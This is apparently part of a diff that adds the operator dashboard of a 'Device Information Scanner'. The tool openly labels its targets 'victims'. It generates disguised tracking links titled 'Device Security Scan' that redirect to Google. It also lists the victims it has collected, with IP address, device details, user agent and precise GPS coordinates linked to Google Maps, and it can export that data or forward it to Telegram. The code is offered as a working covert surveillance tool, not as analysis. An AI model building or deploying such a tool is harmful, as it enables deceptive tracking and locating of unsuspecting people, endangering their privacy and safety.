+                                        <h1 class="display-5 fw-bold text-white mb-2">
+                                            <i class="fas fa-robot"></i> Device Information Scanner
+                                        </h1>
+                                        <p class="lead text-white mb-0">
+                                            Dashboard - View collected victim data
+                                        </p>
+                                    </div>
+                                    <div class="col-md-7 text-end">
+                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
+                                            <button class="btn link-btn mb-2" data-bs-toggle="modal" data-bs-target="#linkModal">
+                                                <i class="fas fa-link"></i> Generate Link
+                                            </button>
+                                            <button class="btn download-btn mb-2" onclick="downloadAllData()">
+                                                <i class="fas fa-download"></i> Download All Data
+                                            </button>
+                                            <button class="btn btn-outline-light mb-2" onclick="refreshDashboard()">
+                                                <i class="fas fa-sync-alt"></i> Refresh
+                                            </button>
+                                            <button class="btn btn-warning mb-2" onclick="clearAllData()">
+                                                <i class="fas fa-trash"></i> Clear Data
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col-lg-4 mb-4">
+                            <div class="info-card glass-card">
+                                <div class="card-header">
+                                    <i class="fas fa-users card-icon"></i> Collected Victims
+                                </div>
+                                <div class="card-body" style="max-height: 400px; overflow-y: auto;">
+                                    <div id="victims-list">
+                                        <p class="text-muted text-center">Loading victims data...</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="info-card glass-card mt-4">
+                                <div class="card-header">
+                                    <i class="fas fa-chart-bar card-icon"></i> Statistics
+                                </div>
+                                <div class="card-body">
+                                    <div id="stats-content">
+                                        <p class="text-muted text-center">Loading statistics...</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="col-lg-8">
+                            <div class="info-card glass-card">
+                                <div class="card-header">
+                                    <i class="fas fa-user-circle card-icon"></i> Victim Details
+                                </div>
+                                <div class="card-body" style="max-height: 500px; overflow-y: auto;">
+                                    <div id="victim-details">
+                                        <div class="text-center py-5">
+                                            <i class="fas fa-user fa-3x text-secondary mb-3"></i>
+                                            <h5>Select a victim to view details</h5>
+                                            <p class="text-muted">Click on any victim from the list to see their collected data</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Link Modal -->
+                <div class="modal fade" id="linkModal" tabindex="-1">
+                    <div class="modal-dialog">
+                        <div class="modal-content">
+                            <div class="modal-header">
+                                <h5 class="modal-title">
+                                    <i class="fas fa-link"></i> Generate Tracking Link
+                                </h5>
+                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                            </div>
+                            <div class="modal-body">
+                                <div class="mb-3">
+                                    <label for="campaign-name" class="form-label">Campaign Name:</label>
+                                    <input type="text" class="form-control" id="campaign-name" 
+                                           placeholder="e.g., Facebook Campaign" 
+                                           value="New Campaign">
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="redirect-url" class="form-label">Redirect URL:</label>
+                                    <input type="url" class="form-control" id="redirect-url" 
+                                           placeholder="https://example.com" 
+                                           value="https://google.com">
+                                </div>
+                                
+                                <div class="mb-3">
+                                    <label for="cloak-title" class="form-label">Page Title:</label>
+                                    <input type="text" class="form-control" id="cloak-title" 
+                                           placeholder="Scanning in progress..." 
+                                           value="Device Security Scan">
+                                </div>
+                                
+                                <div class="text-center">
+                                    <button class="btn link-btn" onclick="generateTrackingLink()">
+                                        <i class="fas fa-magic"></i> Generate Link
+                                    </button>
+                                </div>
+                                
+                                <div id="generated-link-container" class="mt-3" style="display: none;">
+                                    <div class="link-preview" id="generated-link"></div>
+                                    <div class="text-end mt-2">
+                                        <button class="btn btn-sm btn-success" onclick="copyGeneratedLink()">
+                                            <i class="fas fa-copy"></i> Copy Link
+                                        </button>
+                                        <button class="btn btn-sm btn-primary ms-2" onclick="testGeneratedLink()">
+                                            <i class="fas fa-external-link-alt"></i> Test Link
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            // Initialize dashboard
+            initializeDashboard();
+        }
+
+        function initializeDashboard() {
+            console.log('Initializing dashboard...');
+            
+            // Load data
+            campaignManager.loadAllData();
+            
+            // Refresh display
+            refreshVictimsList();
+            updateStatistics();
+            
+            // Show debug info
+            console.log('Dashboard initialized. Victims:', victimsData.length, 'Campaigns:', campaignManager.campaigns.length);
+            
+            // Check localStorage directly
+            const storedVictims = localStorage.getItem('deviceScannerVictims');
+            const storedCampaigns = localStorage.getItem('deviceScannerCampaigns');
+            console.log('LocalStorage - Victims:', storedVictims ? JSON.parse(storedVictims).length : 0);
+            console.log('LocalStorage - Campaigns:', storedCampaigns ? JSON.parse(storedCampaigns).length : 0);
+        }
+
+        function refreshDashboard() {
+            console.log('Refreshing dashboard...');
+            campaignManager.loadAllData();
+            refreshVictimsList();
+            updateStatistics();
+            showToast('Dashboard refreshed', 'info');
+        }
+
+        function refreshVictimsList() {
+            const victimsList = document.getElementById('victims-list');
+            const allVictims = campaignManager.getVictims();
+            
+            console.log('Refreshing victims list. Total victims:', allVictims.length);
+            
+            if (allVictims.length === 0) {
+                victimsList.innerHTML = `
+                    <div class="text-center py-3">
+                        <i class="fas fa-user-slash fa-2x text-secondary mb-2"></i>
+                        <p>No victim data collected yet</p>
+                        <p class="small text-muted">Generate a link and share it to collect data</p>
+                        <button class="btn btn-sm btn-primary mt-2" onclick="testWithSampleData()">
+                            <i class="fas fa-vial"></i> Add Test Data
+                        </button>
+                    </div>
+                `;
+                return;
+            }
+            
+            let html = `
+                <div class="d-flex justify-content-between align-items-center mb-3">
+                    <strong>Total Victims: ${allVictims.length}</strong>
+                    <small class="text-muted">Click to view details</small>
+                </div>
+            `;
+            
+            // Sort by most recent first
+            const sortedVictims = [...allVictims].sort((a, b) => {
+                return new Date(b.timestamp || b.receivedAt) - new Date(a.timestamp || a.receivedAt);
+            });
+            
+            sortedVictims.forEach((victim, index) => {
+                const timeAgo = getTimeAgo(victim.timestamp || victim.receivedAt);
+                const ip = victim.networkInfo?.ipv4 || 'Unknown IP';
+                const device = victim.deviceInfo?.deviceName || 'Unknown Device';
+                
+                html += `
+                    <div class="victim-item" onclick="selectVictim('${victim.id}')" id="victim-${victim.id}">
+                        <div class="d-flex justify-content-between">
+                            <div>
+                                <strong>Victim ${index + 1}</strong>
+                                <span class="badge victim-badge bg-primary">${victim.campaignName || 'Unknown'}</span>
+                            </div>
+                            <small class="text-muted">${timeAgo}</small>
+                        </div>
+                        <div class="small mt-1">
+                            <span class="victim-ip">${ip}</span>
+                            <span class="ms-2">${device}</span>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            victimsList.innerHTML = html;
+        }
+
+        function selectVictim(victimId) {
+            console.log('Selecting victim:', victimId);
+            
+            // Remove active class from all victim items
+            document.querySelectorAll('.victim-item').forEach(item => {
+                item.classList.remove('active');
+            });
+            
+            // Add active class to selected victim
+            const selectedItem = document.getElementById(`victim-${victimId}`);
+            if (selectedItem) {
+                selectedItem.classList.add('active');
+            }
+            
+            // Find victim data
+            let victim = victimsData.find(v => v.id === victimId);
+            if (!victim) {
+                // Check in campaign victims
+                for (const campaign of campaignManager.campaigns) {
+                    const found = campaign.victims.find(v => v.id === victimId);
+                    if (found) {
+                        victim = found;
+                        break;
+                    }
+                }
+            }
+            
+            if (!victim) {
+                document.getElementById('victim-details').innerHTML = `
+                    <div class="text-center py-3">
+                        <i class="fas fa-exclamation-triangle text-warning"></i>
+                        <p>Victim data not found</p>
+                        <p class="small text-muted">ID: ${victimId}</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            // Display victim details
+            displayVictimDetails(victim);
+        }
+
+        function displayVictimDetails(victim) {
+            let html = `
+                <div class="d-flex justify-content-between align-items-center mb-3">
+                    <h5>Victim Details</h5>
+                    <div>
+                        <button class="btn btn-sm telegram-btn" onclick="sendVictimToTelegram('${victim.id}')">
+                            <i class="fab fa-telegram"></i> Send to Telegram
+                        </button>
+                        <button class="btn btn-sm btn-outline-primary ms-1" onclick="downloadVictimData('${victim.id}')">
+                            <i class="fas fa-download"></i> Download
+                        </button>
+                        <button class="btn btn-sm btn-outline-info ms-1" onclick="viewJSON('${victim.id}')">
+                            <i class="fas fa-code"></i> View JSON
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="data-item">
+                            <span class="data-label">Victim ID:</span>
+                            <span class="data-value">${victim.victimID || victim.id}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Campaign:</span>
+                            <span class="data-value">${victim.campaignName || 'Unknown'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Collected:</span>
+                            <span class="data-value">${new Date(victim.timestamp || victim.receivedAt).toLocaleString()}</span>
+                        </div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="data-item">
+                            <span class="data-label">IP Address:</span>
+                            <span class="data-value">${victim.networkInfo?.ipv4 || 'Unknown'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Device:</span>
+                            <span class="data-value">${victim.deviceInfo?.deviceName || 'Unknown'}</span>
+                        </div>
+                        <div class="data-item">
+                            <span class="data-label">Platform:</span>
+                            <span class="data-value">${victim.deviceInfo?.platform || 'Unknown'}</span>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            // Device Info
+            if (victim.deviceInfo) {
+                html += `
+                    <div class="mt-4">
+                        <h6>Device Information</h6>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Screen:</span>
+                                    <span class="data-value">${victim.deviceInfo.screenResolution || 'Unknown'}</span>
+                                </div>
+                                <div class="data-item">
+                                    <span class="data-label">User Agent:</span>
+                                    <span class="data-value small">${victim.deviceInfo.userAgent?.substring(0, 100) || 'Unknown'}...</span>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Language:</span>
+                                    <span class="data-value">${victim.deviceInfo.language || 'Unknown'}</span>
+                                </div>
+                                <div class="data-item">
+                                    <span class="data-label">Memory:</span>
+                                    <span class="data-value">${victim.deviceInfo.deviceMemory || 'Unknown'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Network Info
+            if (victim.networkInfo) {
+                html += `
+                    <div class="mt-4">
+                        <h6>Network Information</h6>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Connection Type:</span>
+                                    <span class="data-value">${victim.networkInfo.connectionType || 'Unknown'}</span>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Status:</span>
+                                    <span class="data-value">${victim.networkInfo.onlineStatus || 'Unknown'}</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            // Location Info
+            if (victim.locationInfo?.latitude) {
+                html += `
+                    <div class="mt-4">
+                        <h6>Location Information</h6>
+                        <div class="row">
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Latitude:</span>
+                                    <span class="data-value">${victim.locationInfo.latitude.toFixed(6)}</span>
+                                </div>
+                                <div class="data-item">
+                                    <span class="data-label">Longitude:</span>
+                                    <span class="data-value">${victim.locationInfo.longitude.toFixed(6)}</span>
+                                </div>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="data-item">
+                                    <span class="data-label">Accuracy:</span>
+                                    <span class="data-value">${victim.locationInfo.accuracy?.toFixed(2) || 'Unknown'} meters</span>
+                                </div>
+                                <div class="data-item">
+                                    <span class="data-label">Map:</span>
+                                    <span class="data-value">
+                                        <a href="https://maps.google.com/?q=${victim.locationInfo.latitude},${victim.locationInfo.longitude}" 
+                                           target="_blank" class="btn btn-sm btn-outline-primary">
+                                            View on Google Maps
+                                        </a>
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            document.getElementById('victim-details').innerHTML = html;
+        }
+
+        function updateStatistics() {
+            const statsContent = document.getElementById('stats-content');
+            const allVictims = campaignManager.getVictims();
+            const campaigns = campaignManager.campaigns;
+            
+            let html = `
+                <div class="text-center mb-3">
+                    <h4>${allVictims.length}</h4>
+                    <p class="small text-muted">Total Victims</p>
+                </div>
+                
+                <div class="row text-center">
+                    <div class="col-6">
+                        <h5>${campaigns.length}</h5>
+                        <p class="small text-muted">Campaigns</p>
+                    </div>
+                    <div class="col-6">
+                        <h5>${allVictims.filter(v => v.locationInfo?.latitude).length}</h5>
+                        <p class="small text-muted">With Location</p>
+                    </div>
+                </div>
+            `;
+            
+            if (campaigns.length > 0) {
+                html += `<hr><h6>Campaign Stats:</h6>`;
+                campaigns.forEach(campaign => {
+                    const campaignVictims = campaign.victims || [];
+                    html += `
+                        <div class="campaign-item">
+                            <strong>${campaign.name}</strong>
+                            <div class="campaign-stats">
+                                Clicks: ${campaign.stats.clicks || 0} | 
+                                Data: ${campaignVictims.length} |
+                                Last: ${campaign.stats.lastAccess ? new Date(campaign.stats.lastAccess).toLocaleDateString() : 'Never'}
+                            </div>
+                        </div>
+                    `;
+                });
+            }
+            
+            statsContent.innerHTML = html;
+        }
+
+        // ============================================
+        // LINK GENERATOR FUNCTIONS
+        // ============================================
+
+        function generateTrackingLink() {
+            const campaignName = document.getElementById('campaign-name').value.trim() || 'New Campaign';
+            const redirectUrl = document.getElementById('redirect-url').value.trim() || 'https://google.com';
+            const cloakTitle = document.getElementById('cloak-title').value.trim() || 'Device Security Scan';
+            
+            // Generate unique campaign ID
+            const campaignId = 'camp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // Create the tracking link
+            const currentUrl = window.location.origin + window.location.pathname;
+            const trackingLink = `${currentUrl}?track=true&cid=${campaignId}&redirect=${encodeURIComponent(redirectUrl)}&title=${encodeURIComponent(cloakTitle)}`;
+            
+            // Save campaign
+            const dataSettings = {
+                redirectUrl: redirectUrl,
+                cloakTitle: cloakTitle
+            };
+            
+            campaignManager.addCampaign(campaignName, trackingLink, dataSettings);
+            
+            // Display the generated link
+            document.getElementById('generated-link').textContent = trackingLink;
+            document.getElementById('generated-link-container').style.display = 'block';
+            
+            showToast(`Link generated for "${campaignName}"`, 'success');
+            
+            // Refresh lists
+            refreshVictimsList();
+            updateStatistics();
+        }
+
+        function copyGeneratedLink() {
+            const linkText = document.getElementById('generated-link').textContent;
+            navigator.clipboard.writeText(linkText).then(() => {
+                showToast('Link copied to clipboard!', 'success');
+            }).catch(err => {
+                // Fallback
+                const textarea = document.createElement('textarea');
+                textarea.value = linkText;
+                document.body.appendChild(textarea);
+                textarea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textarea);
+                showToast('Link copied to clipboard!', 'success');
+            });
+        }
+
+        function testGeneratedLink() {
+            const linkText = document.getElementById('generated-link').textContent;
+            window.open(linkText, '_blank');
+        }
+
+        // ============================================
+        // UTILITY FUNCTIONS
+        // ============================================
+
+        function getDeviceName() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            if (userAgent.includes('iphone')) return 'iPhone';
+            if (userAgent.includes('ipad')) return 'iPad';
+            if (userAgent.includes('android')) return 'Android Device';
+            if (userAgent.includes('windows')) return 'Windows PC';
+            if (userAgent.includes('mac')) return 'Mac';
+            if (userAgent.includes('linux')) return 'Linux PC';
+            
+            return 'Unknown Device';
+        }
+
+        function generateVictimID() {
+            const timestamp = Date.now();
+            const randomStr = Math.random().toString(36).substring(2, 10);
+            const userAgentHash = simpleHash(navigator.userAgent).substring(0, 8);
+            return `VICTIM-${timestamp.toString(36).substring(4)}-${randomStr}-${userAgentHash}`;
+        }
+
+        function simpleHash(str) {
+            let hash = 0;
+            for (let i = 0; i < str.length; i++) {
+                const char = str.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash;
+            }
+            return Math.abs(hash).toString(16);
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        function getTimeAgo(timestamp) {
+            if (!timestamp) return 'Unknown time';
+            
+            const now = new Date();
+            const past = new Date(timestamp);
+            const diff = now - past;
+            
+            const minutes = Math.floor(diff / 60000);
+            const hours = Math.floor(diff / 3600000);
+            const days = Math.floor(diff / 86400000);
+            
+            if (minutes < 1) return 'Just now';
+            if (minutes < 60) return `${minutes}m ago`;
+            if (hours < 24) return `${hours}h ago`;
+            if (days < 7) return `${days}d ago`;
+            return past.toLocaleDateString();
+        }
+
+        function downloadAllData() {
+            const data = {
+                campaigns: campaignManager.campaigns,
+                victims: campaignManager.getVictims(),
+                exportedAt: new Date().toISOString()
+            };
+            
+            const dataStr = JSON.stringify(data, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const downloadLink = document.createElement('a');
+            downloadLink.href = URL.createObjectURL(dataBlob);
+            downloadLink.download = `device-scanner-data-${new Date().toISOString().split('T')[0]}.json`;
+            
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+            
+            showToast('All data downloaded successfully!', 'success');
+        }
+
+        function downloadVictimData(victimId) {
+            const victim = victimsData.find(v => v.id === victimId);
+            if (!victim) {
+                showToast('Victim data not found', 'error');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(victim, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            
+            const downloadLink = document.createElement('a');
+            downloadLink.href = URL.createObjectURL(dataBlob);
+            downloadLink.download = `victim-${victim.victimID || victimId}.json`;
+            
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+            
+            showToast('Victim data downloaded!', 'success');
+        }
+
+        function viewJSON(victimId) {
+            const victim = victimsData.find(v => v.id === victimId);
+            if (!victim) {
+                showToast('Victim data not found', 'error');
+                return;
+            }
+            
+            const jsonStr = JSON.stringify(victim, null, 2);
+            const newWindow = window.open();
+            newWindow.document.write(`<pre>${jsonStr}</pre>`);
+        }
+
+        function sendVictimToTelegram(victimId) {
+            const victim = victimsData.find(v => v.id === victimId);
+            if (!victim) {
+                showToast('Victim data not found', 'error');
+                return;
+            }
+            
+            showToast('Sending to Telegram...', 'info');
+            sendVictimDataToTelegram(victim, victim.campaignId)
+                .then(() => showToast('Sent to Telegram successfully!', 'success'))
+                .catch(err => showToast(`Failed to send: ${err.message}`, 'error'));
+        }
+
+        function clearAllData() {
+            if (confirm('Are you sure you want to clear ALL data? This cannot be undone.')) {
+                campaignManager.clearAllData();
+                refreshVictimsList();
+                updateStatistics();
+                showToast('All data cleared', 'warning');
+            }
+        }
+
+        function testWithSampleData() {
+            const sampleVictim = {
+                id: 'test_victim_' + Date.now(),
+                victimID: 'TEST-VICTIM-123',
+                campaignId: 'test_campaign',
+                campaignName: 'Test Campaign',
+                timestamp: new Date().toISOString(),
+                deviceInfo: {
+                    platform: 'Test Platform',
+                    deviceName: 'Test Device',
+                    screenResolution: '1920x1080',
+                    userAgent: 'Mozilla/5.0 (Test)',
+                    language: 'en-US'
+                },
+                networkInfo: {
+                    ipv4: '192.168.1.100',
+                    onlineStatus: 'Online'
+                },
+                locationInfo: {
+                    latitude: 40.7128,
+                    longitude: -74.0060,
+                    accuracy: 50
+                }
+            };
+            
+            victimsData.push(sampleVictim);
+            campaignManager.saveAllData();
+            refreshVictimsList();
+            updateStatistics();
+            showToast('Test data added', 'info');
+        }
+
+        function showToast(message, type = 'info') {
+            // Remove existing toasts
+            const existingToasts = document.querySelectorAll('.custom-toast');
+            existingToasts.forEach(toast => toast.remove());
+            
+            // Create toast
+            const toast = document.createElement('div');
+            toast.className = 'custom-toast';
+            
+            let bgColor = 'bg-primary';
+            let icon = 'fas fa-info-circle';
+            
+            if (type === 'success') {
+                bgColor = 'bg-success';
+                icon = 'fas fa-check-circle';
+            } else if (type === 'error') {
+                bgColor = 'bg-danger';
+                icon = 'fas fa-exclamation-circle';
+            } else if (type === 'warning') {
+                bgColor = 'bg-warning';
+                icon = 'fas fa-exclamation-triangle';
+            } else if (type === 'info') {
+                bgColor = 'bg-info';
+                icon = 'fas fa-info-circle';
+            }
+            
+            toast.innerHTML = `
+                <div class="toast show" role="alert">
+                    <div class="toast-header ${bgColor} text-white">
+                        <i class="${icon} me-2"></i>
+                        <strong class="me-auto">Device Scanner</strong>
+                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast"></button>
+                    </div>
+                    <div class="toast-body">
+                        ${message}
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(toast);
+            
+            // Auto remove after 5 seconds
+            setTimeout(() => {
+                if (toast.parentNode) {
+                    toast.remove();
+                }
+            }, 5000);
+            
+            // Add close button functionality
+            const closeBtn = toast.querySelector('.btn-close');
+            if (closeBtn) {
+                closeBtn.addEventListener('click', () => {
+                    toast.remove();
+                });
+            }
+        }
+    </script>
+</body>
+</html>
